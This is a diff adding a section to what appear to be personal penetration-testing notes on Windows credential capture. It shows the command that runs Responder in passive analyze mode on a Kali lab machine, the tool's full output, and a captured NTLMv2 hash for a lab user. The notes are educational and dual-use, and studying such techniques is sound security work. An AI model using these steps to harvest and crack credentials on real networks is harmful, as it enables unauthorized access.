@@ -130,7 +130,103 @@
 
 5. Utilize password or hash to login
    - Review [Windows\remote-access](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/remote-access.md) for ways to login remotely using a password or hash
-     
+
+Responder can also be run in analyze mode with the -A option to perform passive recon
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo responder -I eth0 -AdPv
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [OFF]
+    NBT-NS                     [OFF]
+    MDNS                       [OFF]
+    DNS                        [ON]
+    DHCP                       [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [ON]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [ON]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [10.0.2.7]
+    Responder IPv6             [fe80::6e5f:b197:25b4:903e]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-J69N6HPHI4T]
+    Responder Domain Name      [T737.LOCAL]
+    Responder DCE-RPC Port     [46166]
+
+[+] Listening for events...                                                                                                                               
+
+[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
+[SMB] NTLMv2-SSP Client   : 10.0.2.5
+[SMB] NTLMv2-SSP Username : SPIDERMAN\peterparker
+[SMB] NTLMv2-SSP Hash     : peterparker::SPIDERMAN:596f081455d39bfd:E9ACF7BFAAC37C57A740B618EF076214:0101000000000000805B378F7F74DB01351DF83F5687B0F50000000002000800540037003300370001001E00570049004E002D004A00360039004E00360048005000480049003400540004003400570049004E002D004A00360039004E0036004800500048004900340054002E0054003700330037002E004C004F00430041004C000300140054003700330037002E004C004F00430041004C000500140054003700330037002E004C004F00430041004C0007000800805B378F7F74DB0106000400020000000800300030000000000000000100000000200000BB6CED94F69348516F20C9B05391DC35C5B8D66FA09532BE9291089D5DAC322E0A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0032002E0037000000000000000000                                                     
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[HTTP] Sending NTLM authentication request to 10.0.2.5
+[+] Exiting...
+                                                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$
+```
+
+
 ## Tools
 - Responder
 - Hashcat
